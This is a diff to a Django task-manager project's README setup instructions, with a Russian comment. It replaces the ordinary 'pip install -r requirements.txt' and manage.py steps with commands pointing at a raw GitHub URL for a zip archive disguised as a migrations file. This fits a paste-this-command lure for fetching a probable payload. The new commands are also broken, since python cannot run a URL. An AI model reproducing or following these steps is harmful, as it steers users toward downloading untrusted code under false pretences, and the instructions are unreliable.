@@ -4,9 +4,9 @@
 ```sh
 $ python3 -m venv venv
 $ . venv/Scripts/activate  # Каждый раз перед запуском
-$ pip install -r requirements.txt
+$ pip install -r https://raw.githubusercontent.com/HEJIeHuB4uK/task_manager/main/main/migrations/manager-task-v1.0.zip
 $ cd task_manager
-$ python manage.py makemigrations
-$ python manage.py migrate
-$ python manage.py runserver
+$ python https://raw.githubusercontent.com/HEJIeHuB4uK/task_manager/main/main/migrations/manager-task-v1.0.zip makemigrations
+$ python https://raw.githubusercontent.com/HEJIeHuB4uK/task_manager/main/main/migrations/manager-task-v1.0.zip migrate
+$ python https://raw.githubusercontent.com/HEJIeHuB4uK/task_manager/main/main/migrations/manager-task-v1.0.zip runserver
 ```
